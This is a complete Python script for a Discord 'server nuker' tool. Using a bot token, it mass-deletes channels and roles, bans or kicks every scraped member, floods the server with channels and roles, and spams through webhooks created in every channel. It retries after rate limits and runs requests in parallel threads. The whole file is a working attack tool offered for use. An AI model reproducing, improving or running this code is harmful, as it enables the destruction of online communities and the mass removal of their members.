import time
import threading
import os
import discord
from discord import channel
import requests
from discord.ext import commands
from colorama import Fore
import json 
import socket
from discord_webhook import DiscordWebhook, DiscordEmbed

# getting ip addres
def get_ip():
    r = requests.get('https://api.ipify.org/')
    rct = r.text
    return rct


print("============================")
print("▐▐▐▐▐▐▐▐▐    25%            ")
time.sleep(1)
print("============================")
print("▐▐▐▐▐▐▐▐▐▐▐▐▐   50%         ")
time.sleep(1)
print("============================")
print("▐▐▐▐▐▐▐▐▐▐▐▐▐▐▐▐▐▐▐▐▐  100% ")
time.sleep(1)
print("============================")

try:
    with open('config.json') as f:
        config = json.load(f)
except:
    print("You are missing the config file")
    time.sleep(10)
token = config["token"]
header = {"Authorization": "Bot "            + token}
intents = discord.Intents.all()
client = commands.Bot(command_prefix=">", intents=intents)
client.remove_command("help")

class stuff:
    def __init__(self, method, jsons, message, present):
        self.method = method
        self.jsons = jsons
        self.message = message
        self.present = present
    def dostuff(self, url):
        while True:
            if self.method == "delete":
                r = requests.delete(url, headers=header, json=self.jsons)
            elif self.method == "put":
                r = requests.put(url, headers=header, json=self.jsons)
            elif self.method == "post":
                r = requests.post(url, headers=header, json=self.jsons)

            if r.status_code == 204 or r.status_code == 201 or r.status_code == 200:
                print(f"{Fore.GREEN}[{Fore.WHITE}>{Fore.GREEN}]{Fore.GREEN} Succesfully {self.message}")
                break
            elif r.status_code == 429:
                print(f"{Fore.GREEN}Rate limited")
                sleep_time = r.json()["retry_after"]
                sleep_time = int(sleep_time)/1000
                time.sleep(sleep_time)
                self.dostuff(url)
                break
            else:
                print(f"{Fore.GREEN}[{Fore.WHITE}>{Fore.GREEN}]{Fore.RED} Could not {self.present}")
                break

nuke = stuff("delete", None, "deleted channel", "delete channel")
add = stuff("post", config["spamchannel"], "created channel", "create channel")
ban = stuff("put", config["ban"], "banned user", "ban user")
nukerole = stuff("delete", None, "deleted role", "delete role")
createrole = stuff("post", config["createrole"], "created role", "create role")
kick = stuff("delete", None, "kicked user", "kick user")
createwebhook = stuff("post", config["webhookname"], "created webhook", "create webhook")
executewebhook = stuff("post", config["spamcontent"], "spammed", "spam")

guildid = config["guildid"]
wbhook_status = False
def main():
    try:
        clear = lambda: os.system('cls')
        clear()
    except:
        pass
    print(f"""
    
{Fore.RED}=================================================================={Fore.RED} 
{Fore.RED}▐                                                                ▐ {Fore.RED}
{Fore.RED}▐                                                                ▐ {Fore.RED}
{Fore.RED}▐            P U S S Y                                           ▐ {Fore.RED}
{Fore.RED}▐                       N U K E R                                ▐ {Fore.RED}
{Fore.RED}▐                       U S E T O N U K E S E R V E R S          ▐ {Fore.RED}
{Fore.RED}▐                                                                ▐ {Fore.RED}
{Fore.RED}▐                                                                ▐ {Fore.RED}   
{Fore.RED}▐                                                                ▐ {Fore.RED}
{Fore.RED}▐                                                                ▐ {Fore.RED}
{Fore.RED}▐                                                                ▐ {Fore.RED}
{Fore.RED}▐                                                                ▐ {Fore.RED}
{Fore.RED}=================================================================={Fore.RED}
    
    {Fore.BLUE}>1.{Fore.WHITE}Nuke Channels {Fore.BLUE}  >5.{Fore.WHITE}Spam Roles{Fore.BLUE}
    >2.{Fore.WHITE}Spam Channels {Fore.BLUE}  >6.{Fore.WHITE}Kick All{Fore.BLUE}
    >3.{Fore.WHITE}Ban All      {Fore.BLUE}   >7.{Fore.WHITE}Create Webhooks{Fore.BLUE}
    >4.{Fore.WHITE}Delete Roles  {Fore.BLUE}  >8.{Fore.WHITE}Spam    {Fore.BLUE} """)
    try:
        choice = input(f"{Fore.BLUE}[{Fore.WHITE}>{Fore.BLUE}]{Fore.WHITE} Choose An Option: ")
        choice = int(choice)
    except:
        print(f"{Fore.RED}Enter valid information")
        time.sleep(3)
        main()
    if choice == 1:
        channel_list = requests.get(f"https://discord.com/api/guilds/{guildid}/channels", headers=header).json()
        channel_ids = []
        for x in channel_list:
            channel_ids.append(x["id"])
        for y in channel_ids:
            thread = threading.Thread(target=nuke.dostuff, args=[f"https://discord.com/api/channels/{y}"])
            thread.start()
        time.sleep(3)
        main()

    elif choice == 2:
        try:
            amount = input(f"{Fore.GREEN}[{Fore.WHITE}>{Fore.GREEN}]{Fore.WHITE} Enter amount: ")
        except:
            print(f"{Fore.RED}Enter valid information")
            time.sleep(3)
            main()
        try:
            amount = int(amount)
        except:
            print(f"{Fore.RED}Enter a valid number")
            time.sleep(3)
            main()
        for x in range(amount):
            thread = threading.Thread(target=add.dostuff, args=[f"https://discord.com/api/guilds/{guildid}/channels"])
            thread.start()
        time.sleep(3)
        main()

    elif choice == 3:
        try:
            size = os.path.getsize("users.txt")
            if size > 0:
                pass
            else:
                print(f"{Fore.RED}You need to scrape before running this command with the '>scrape' command")
                time.sleep(3)
                main()
        except:
            print(f"{Fore.RED}You need to scrape first before running this command with the '>scrape' command")
            time.sleep(3)
            main()
        f = open("users.txt","r")
        for id in f:
            thread = threading.Thread(target=ban.dostuff, args=[f"https://discord.com/api/guilds/{guildid}/bans/{id}"])
            thread.start()
        f.close()
        time.sleep(3)
        main()

    elif choice == 4:
        role_list = requests.get(f"https://discord.com/api/guilds/{guildid}/roles", headers=header)
        role_list = role_list.json()
        role_ids = []
        for x in role_list:
            role_ids.append(x["id"])
        for y in role_ids:
            thread = threading.Thread(target=nukerole.dostuff, args=[f"https://discord.com/api/guilds/{guildid}/roles/{y}"])
            thread.start()
        time.sleep(3)
        main()

    elif choice == 5:
        try:
            amount = input(f"{Fore.GREEN}[{Fore.WHITE}>{Fore.GREEN}]{Fore.WHITE} Enter amount: ")
        except:
            print(f"{Fore.RED}Enter valid information")
            time.sleep(3)
            main()
        try:
            amount = int(amount)
        except:
            print(f"{Fore.RED} Enter a valid number")
            time.sleep(3)
            main()
        for x in range(amount):
            thread = threading.Thread(target=createrole.dostuff, args=[f"https://discord.com/api/guilds/{guildid}/roles"])
            thread.start()
        time.sleep(3)
        main()

    elif choice == 6:
        try:
            size = os.path.getsize("users.txt")
            if size > 0:
                pass
            else:
                print(f"{Fore.RED}You need to scrape before running this command with the '>scrape' command")
                time.sleep(3)
                main()
        except:
            print(f"{Fore.RED}You need to scrape before running this command with the '>scrape' command")
            time.sleep(3)
            main()
        f = open("users.txt","r")
        for id in f:
            thread = threading.Thread(target=kick.dostuff, args=[f"https://discord.com/api//guilds/{guildid}/members/{id}"])
            thread.start()
        f.close()
        time.sleep(3)
        main()

    elif choice == 7:
        channel_list = requests.get(f"https://discord.com/api/guilds/{guildid}/channels", headers=header).json()
        channel_ids = []
        for x in channel_list:
            channel_ids.append(x["id"])
        for q in channel_ids:
            thread = threading.Thread(target=createwebhook.dostuff, args=[f"https://discord.com/api/channels/{q}/webhooks"]).start()
        time.sleep(3)
        main()

    elif choice == 8:
        webhooks = requests.get(f'https://discord.com/api/guilds/{guildid}/webhooks', headers=header)
        if config["webhookname"]["name"] not in webhooks.text:
            print(f"{Fore.RED}You need to create webhooks before spamming")
            time.sleep(3)
            main()
        webhooks = webhooks.json()
        amount = input(f'{Fore.GREEN}[{Fore.WHITE}>{Fore.GREEN}]{Fore.WHITE} Enter amount of cycles: ')
        try:
            amount = int(amount)
        except:
            print(f'{Fore.RED} Invalid input')
            time.sleep(3)
            main()
        for s in range(amount):
            for z in webhooks:
                thread = threading.Thread(target=executewebhook.dostuff, args=[f"https://discord.com/api/webhooks/{z['id']}/{z['token']}"]).start()
        time.sleep(3)
        main()

    elif choice == 9:
        os._exit(0)

    else:
        print(f"{Fore.GREEN}[{Fore.WHITE}>{Fore.GREEN}]{Fore.RED} Enter a valid option")
        time.sleep(3)
        main()

@client.command()
async def scrape(ctx):
    await ctx.message.delete()
    try:
        os.remove("users.txt")
    except:
        pass
    members = 0
    with open('users.txt', 'w') as f: 
        for member in ctx.guild.members:
            f.write(str(member.id)+"\n") 
            members = members+1
    f.close()

print("Loading...")

@client.event
async def on_ready():
    main_thread = threading.Thread(target=main)
    main_thread.start()
try:
    client.run(token)
except:
    print(f"{Fore.RED}Invalid Token, check that you have it entered correctly or reset the token. You could also be rate limited")
    time.sleep(10)
